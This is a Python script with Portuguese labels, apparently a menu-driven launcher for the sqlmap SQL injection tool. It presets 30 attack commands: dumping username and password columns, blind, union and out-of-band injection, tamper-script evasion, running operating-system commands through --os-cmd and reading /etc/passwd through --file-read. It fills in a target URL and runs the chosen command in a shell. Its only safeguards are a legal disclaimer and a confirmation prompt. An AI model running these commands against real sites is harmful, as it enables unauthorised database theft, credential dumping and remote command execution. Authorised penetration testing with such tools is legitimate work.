#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import time
from colorama import Fore, Style, init

init(autoreset=True)

# ======= Banner =======
def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(Fore.RED + Style.BRIGHT + r"""
   ███████╗ ██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗ 
   ██╔════╝██╔═══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
   ███████╗██║   ██║██║     ██╔████╔██║███████║██████╔╝
   ╚════██║██║   ██║██║     ██║╚██╔╝██║██╔══██║██╔═══╝ 
   ███████║╚██████╔╝███████╗██║ ╚═╝ ██║██║  ██║██║     
   ╚══════╝ ╚═════╝ ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
            [ SQLMap Attack Menu - 30 Techniques ]
    """ + Style.RESET_ALL)

# ======= Técnicas de Ataque SQLMap =======
tecnicas = {
    1: ("Detecção Básica", "python -m sqlmap -u \"TARGET_URL\" --batch"),
    2: ("Detecção com User-Agent", "python -m sqlmap -u \"TARGET_URL\" --random-agent --batch"),
    3: ("Detecção com Proxy", "python -m sqlmap -u \"TARGET_URL\" --proxy=\"http://127.0.0.1:8080\" --batch"),
    4: ("Detecção com Cookies", "python -m sqlmap -u \"TARGET_URL\" --cookie=\"PHPSESSID=value\" --batch"),
    5: ("Detecção com POST Data", "python -m sqlmap -u \"TARGET_URL\" --data=\"param1=value1&param2=value2\" --batch"),
    6: ("Detecção com Headers", "python -m sqlmap -u \"TARGET_URL\" --headers=\"X-Forwarded-For:127.0.0.1\" --batch"),
    7: ("Detecção de DBMS", "python -m sqlmap -u \"TARGET_URL\" --dbms=mysql --batch"),
    8: ("Detecção de Tabelas", "python -m sqlmap -u \"TARGET_URL\" --tables --batch"),
    9: ("Detecção de Colunas", "python -m sqlmap -u \"TARGET_URL\" -T users --columns --batch"),
    10: ("Dump de Dados", "python -m sqlmap -u \"TARGET_URL\" -T users --dump --batch"),
    11: ("Dump com WHERE", "python -m sqlmap -u \"TARGET_URL\" -T users --where=\"id=1\" --dump --batch"),
    12: ("Dump com LIMIT", "python -m sqlmap -u \"TARGET_URL\" -T users --dump --start=1 --stop=10 --batch"),
    13: ("Dump com Colunas Específicas", "python -m sqlmap -u \"TARGET_URL\" -T users -C username,password --dump --batch"),
    14: ("Ataque de Força Bruta", "python -m sqlmap -u \"TARGET_URL\" --common-tables --batch"),
    15: ("Ataque de UNION", "python -m sqlmap -u \"TARGET_URL\" --technique=U --batch"),
    16: ("Ataque de Boolean-Based Blind", "python -m sqlmap -u \"TARGET_URL\" --technique=B --batch"),
    17: ("Ataque de Time-Based Blind", "python -m sqlmap -u \"TARGET_URL\" --technique=T --batch"),
    18: ("Ataque de Error-Based", "python -m sqlmap -u \"TARGET_URL\" --technique=E --batch"),
    19: ("Ataque de Stacked Queries", "python -m sqlmap -u \"TARGET_URL\" --technique=S --batch"),
    20: ("Ataque de Out-of-Band", "python -m sqlmap -u \"TARGET_URL\" --technique=O --batch"),
    21: ("Ataque com Tamper Scripts", "python -m sqlmap -u \"TARGET_URL\" --tamper=space2comment --batch"),
    22: ("Ataque Multi-Tamper", "python -m sqlmap -u \"TARGET_URL\" --tamper=space2comment,charencode --batch"),
    23: ("Ataque com Level/Risk", "python -m sqlmap -u \"TARGET_URL\" --level=3 --risk=3 --batch"),
    24: ("Ataque com Delay", "python -m sqlmap -u \"TARGET_URL\" --delay=1 --batch"),
    25: ("Ataque com Timeout", "python -m sqlmap -u \"TARGET_URL\" --timeout=30 --batch"),
    26: ("Ataque com Retries", "python -m sqlmap -u \"TARGET_URL\" --retries=3 --batch"),
    27: ("Ataque com Threads", "python -m sqlmap -u \"TARGET_URL\" --threads=5 --batch"),
    28: ("Ataque com Prefix/Suffix", "python -m sqlmap -u \"TARGET_URL\" --prefix=\"'\" --suffix=\"'\" --batch"),
    29: ("Ataque com Code Execution", "python -m sqlmap -u \"TARGET_URL\" --os-cmd=\"whoami\" --batch"),
    30: ("Ataque com File Operations", "python -m sqlmap -u \"TARGET_URL\" --file-read=\"/etc/passwd\" --batch"),
}

# ======= Verificar se o SQLMap está instalado =======
def verificar_sqlmap():
    try:
        # Primeiro tenta com o comando sqlmap normal
        result = subprocess.run(["sqlmap", "--version"], capture_output=True, text=True, timeout=10)
        if "sqlmap" in result.stdout or "sqlmap" in result.stderr:
            print(Fore.GREEN + "[+] SQLMap encontrado (comando: sqlmap)!")
            return "sqlmap"
    except (subprocess.CalledProcessError, FileNotFoundError):
        pass
    
    try:
        # Se não encontrar, tenta com python -m sqlmap
        result = subprocess.run(["python", "-m", "sqlmap", "--version"], capture_output=True, text=True, timeout=10)
        if "sqlmap" in result.stdout or "sqlmap" in result.stderr:
            print(Fore.GREEN + "[+] SQLMap encontrado (comando: python -m sqlmap)!")
            return "python -m sqlmap"
    except (subprocess.CalledProcessError, FileNotFoundError):
        pass
    
    try:
        # Tenta com python3 -m sqlmap
        result = subprocess.run(["python3", "-m", "sqlmap", "--version"], capture_output=True, text=True, timeout=10)
        if "sqlmap" in result.stdout or "sqlmap" in result.stderr:
            print(Fore.GREEN + "[+] SQLMap encontrado (comando: python3 -m sqlmap)!")
            return "python3 -m sqlmap"
    except (subprocess.CalledProcessError, FileNotFoundError):
        pass
    
    print(Fore.RED + "[X] SQLMap não encontrado.")
    
    # Tentar instalar automaticamente via pip
    print(Fore.YELLOW + "[~] Tentando instalar o SQLMap via pip...")
    try:
        subprocess.run(["pip", "install", "sqlmap"], 
                     capture_output=True, timeout=300)
        
        # Verificar se a instalação foi bem-sucedida
        try:
            result = subprocess.run(["python", "-m", "sqlmap", "--version"], 
                                  capture_output=True, text=True, timeout=10)
            if "sqlmap" in result.stdout or "sqlmap" in result.stderr:
                print(Fore.GREEN + "[+] SQLMap instalado com sucesso via pip!")
                return "python -m sqlmap"
        except:
            pass
            
    except Exception as e:
        print(Fore.RED + f"[X] Falha ao instalar SQLMap: {e}")
    
    print(Fore.YELLOW + "[!] Instale manualmente: pip install sqlmap")
    return None

# ======= Obter entrada do usuário =======
def obter_entrada(prompt, default=""):
    if default:
        entrada = input(Fore.YELLOW + f"{prompt} [{default}]: ").strip()
        return entrada if entrada else default
    else:
        return input(Fore.YELLOW + f"{prompt}: ").strip()

# ======= Construir comando SQLMap =======
def construir_comando(base_cmd, comando_sqlmap):
    # Substituir o comando base pelo comando sqlmap correto
    comando = base_cmd.replace("python -m sqlmap", comando_sqlmap)
    
    # Substituir TARGET_URL se necessário
    if "TARGET_URL" in comando:
        url = obter_entrada("Digite a URL alvo", "http://alvo.com/vulneravel.php?id=1")
        comando = comando.replace("TARGET_URL", f'"{url}"')
    
    # Personalizar outros parâmetros
    if "--data=" in comando and "param1=value1&param2=value2" in comando:
        data = obter_entrada("Digite os dados POST", "param1=valor1&param2=valor2")
        comando = comando.replace("param1=value1&param2=value2", data)
    
    if "--cookie=" in comando and "PHPSESSID=value" in comando:
        cookie = obter_entrada("Digite os cookies", "PHPSESSID=valor")
        comando = comando.replace("PHPSESSID=value", cookie)
    
    if "--dbms=" in comando and "mysql" in comando:
        dbms = obter_entrada("Digite o DBMS", "mysql")
        comando = comando.replace("mysql", dbms)
    
    if "-T" in comando and "users" in comando:
        tabela = obter_entrada("Digite o nome da tabela", "usuarios")
        comando = comando.replace("users", tabela)
    
    if "-C" in comando and "username,password" in comando:
        colunas = obter_entrada("Digite as colunas", "usuario,senha")
        comando = comando.replace("username,password", colunas)
    
    if "--tamper=" in comando and "space2comment" in comando:
        tamper = obter_entrada("Digite o script tamper", "space2comment")
        comando = comando.replace("space2comment", tamper)
    
    if "--file-read=" in comando and "/etc/passwd" in comando:
        arquivo = obter_entrada("Digite o caminho do arquivo", "/etc/passwd")
        comando = comando.replace("/etc/passwd", arquivo)
    
    if "--os-cmd=" in comando and "whoami" in comando:
        cmd = obter_entrada("Digite o comando", "whoami")
        comando = comando.replace("whoami", cmd)
    
    return comando

# ======= Executar comando SQLMap =======
def executar_comando(comando):
    print(Fore.CYAN + f"[>] Executando: {comando}")
    
    # Confirmar execução
    confirmar = input(Fore.YELLOW + "Deseja executar este comando? (S/N): ").strip().upper()
    if confirmar != 'S':
        print(Fore.YELLOW + "[!] Comando cancelado.")
        return
    
    try:
        # Executar o comando
        processo = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Mostrar saída em tempo real
        while True:
            output = processo.stdout.readline()
            if output == b'' and processo.poll() is not None:
                break
            if output:
                print(output.decode().strip())
        
        # Verificar se houve erro
        stderr = processo.stderr.read()
        if stderr:
            print(Fore.RED + f"Erro: {stderr.decode()}")
            
    except KeyboardInterrupt:
        print(Fore.RED + "\n[X] Comando interrompido pelo usuário.")
    except Exception as e:
        print(Fore.RED + f"[X] Erro ao executar comando: {e}")

# ======= Mostrar técnicas =======
def mostrar_tecnicas():
    print(Fore.CYAN + "\n[~] Técnicas de Ataque Disponíveis:")
    print(Fore.CYAN + "-" * 80)
    for i, (nome, comando) in tecnicas.items():
        print(f"{Fore.YELLOW}[{i:2d}] {nome}")

# ======= Menu =======
def menu(comando_sqlmap):
    while True:
        banner()
        mostrar_tecnicas()
        
        print(Fore.CYAN + "\n" + "="*80)
        print(Fore.MAGENTA + "OPÇÕES:")
        print(Fore.CYAN + "[1-30] Selecionar técnica de ataque")
        print(Fore.CYAN + "[C]    Comando personalizado do SQLMap")
        print(Fore.CYAN + "[0]    Sair")
        print(Fore.CYAN + "="*80)

        try:
            escolha = input(Fore.YELLOW + "\nEscolha uma opção: ").strip().upper()
            
            if escolha == '0':
                print(Fore.GREEN + "Saindo...")
                sys.exit()
            elif escolha == 'C':
                comando_personalizado = input(Fore.YELLOW + "Digite o comando SQLMap personalizado: ").strip()
                # Adicionar o comando sqlmap correto se não estiver presente
                if not comando_personalizado.startswith("sqlmap") and not "python" in comando_personalizado:
                    comando_personalizado = f"{comando_sqlmap} {comando_personalizado}"
                executar_comando(comando_personalizado)
                input(Fore.GREEN + "\nPressione Enter para continuar...")
            else:
                try:
                    escolha_num = int(escolha)
                    if escolha_num in tecnicas:
                        nome, comando_base = tecnicas[escolha_num]
                        comando_final = construir_comando(comando_base, comando_sqlmap)
                        executar_comando(comando_final)
                        input(Fore.GREEN + "\nPressione Enter para continuar...")
                    else:
                        print(Fore.RED + "Opção inválida.")
                        time.sleep(1)
                except ValueError:
                    print(Fore.RED + "Opção inválida.")
                    time.sleep(1)
                    
        except KeyboardInterrupt:
            print(Fore.RED + "\n[X] Interrompido pelo usuário.")
            sys.exit()
        except Exception as e:
            print(Fore.RED + f"Erro: {e}")
            time.sleep(2)

# ======= Aviso Legal =======
def mostrar_aviso():
    print(Fore.RED + Style.BRIGHT + "\n" + "="*80)
    print("AVISO LEGAL:")
    print("Este software é apenas para fins educacionais e de teste de segurança.")
    print("Só utilize em sistemas que você possui permissão explícita para testar.")
    print("O uso indevido desta ferramenta é de sua exclusiva responsabilidade.")
    print("Respeite as leis locais e não utilize para atividades ilegais.")
    print("="*80)
    
    resposta = input(Fore.YELLOW + "\nVocê concorda com os termos? (S/N): ").strip().upper()
    if resposta != 'S':
        print(Fore.RED + "Você precisa concordar com os termos para usar este software.")
        sys.exit(1)

# ======= MAIN =======
if __name__ == "__main__":
    mostrar_aviso()
    comando_sqlmap = verificar_sqlmap()
    if comando_sqlmap:
        menu(comando_sqlmap)
    else:
        print(Fore.RED + "[X] SQLMap não está instalado. Abortando.")
        sys.exit(1)
